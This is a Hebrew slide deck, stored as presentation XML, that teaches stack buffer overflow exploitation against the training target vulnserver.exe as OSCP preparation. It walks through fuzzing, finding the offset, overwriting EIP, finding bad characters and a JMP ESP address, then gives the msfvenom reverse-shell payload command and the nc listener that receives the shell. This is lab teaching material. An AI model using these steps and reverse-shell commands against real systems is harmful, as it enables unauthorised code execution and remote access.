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גלישת חוצץ (Buffer Overflow)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10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זיכרון, Stack ו-Registers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>מתודולוגיית 7 השלבים של BOF</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>Fuzzing → Offset → EIP → Shellcode</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>ניצול מלא של vulnserver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ללמוד Buffer Overflow?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הבסיס לכתיבת </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Exploits</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>הבנת Stack, Registers ו-Shellcode</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>ה”טקס מעבר” הקלאסי של </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>OSCP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>מפריד בין “מריץ כלים” ל”מבין”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זיכרון ו-Registers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EIP</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — מצביע להוראה הבאה 🎯 המטרה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>ESP</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — מצביע לראש ה-Stack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>EBP</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — בסיס ה-Frame</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>מי ששולט ב-EIP — שולט בביצוע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איך נוצרת גלישה?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חוצץ בגודל קבוע + קלט </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>ללא בדיקת אורך</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>הקלט “גולש” ודורס זיכרון סמוך</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>דורס את כתובת החזרה — </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>EIP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>strcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> במקום </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>strncpy</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> = הבעיה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מבנה ה-Stack ב-Overflow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[ Buffer ]</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — מתמלא ב-A</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>[ Saved EBP ]</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — נדרס</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>[ EIP ]</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> ← כאן נשתול </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>כתובת שלנו</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>אחריו: NOPs + Shellcode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סביבת המעבדה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מטרה: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>vulnserver.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Immunity Debugger</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>mona.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>תוקף: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Kali</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (Python, msfvenom)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>חלופה: TryHackMe “Buffer Overflow Prep”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1-2: Spiking ו-Fuzzing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Spiking</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — איזו פקודה קורסת (TRUN)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Fuzzing</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — שולחים כמות גדלה של A</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>מוצאים בערך מתי קורס (~2000B)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>סקריפט Python פשוט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3-4: Offset ו-EIP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msf-pattern_create -l 3000</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → דפוס ייחודי</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>קוראים EIP → </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>msf-pattern_offset</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>2003</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>A×2003 + B×4</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>EIP = 42424242</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> ✅</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>הוכחת שליטה מלאה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5: Bad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בתים ש”משבשים” את ה-payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>הנפוץ: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1">
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>\x00</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (Null Byte)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>שולחים </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>\x01</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>…</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>\xff</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, משווים ב-mona</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>בית רע שלא זוהה = Shellcode הרוס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6: JMP ESP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ESP מצביע ל-Shellcode — נקפוץ לשם</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>!mona modules</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → מודול ללא הגנות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>!mona find -s "\xff\xe4"</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → כתובת</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Little-Endian:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>625011AF</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>\xaf\x11\x50\x62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7: Shellcode ו-Shell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msfvenom -p windows/shell_reverse_tcp -b "\x00"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>Payload: </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>A×offset + JMP ESP + NOPs + Shellcode</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>nc -lvnp 4444</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → מריצים → </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Shell!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>NOP Sled = “מרווח נחיתה” בטוח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7 השלבים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Spike → Fuzz → Offset → EIP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>Bad Chars → JMP ESP → Shellcode</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>זה בדיוק מה שנבחן ב-OSCP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>הגנות מודרניות: ASLR, DEP, Canaries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BOF = קלט ללא בדיקת אורך → דריסת EIP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>שליטה ב-EIP = שליטה בביצוע</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>7 שלבים קבועים — שולטים בהם בתרגול</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>Bad Chars ו-JMP ESP = הנקודות הקריטיות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2026-09-29T10:53:36Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-29T10:53:36Z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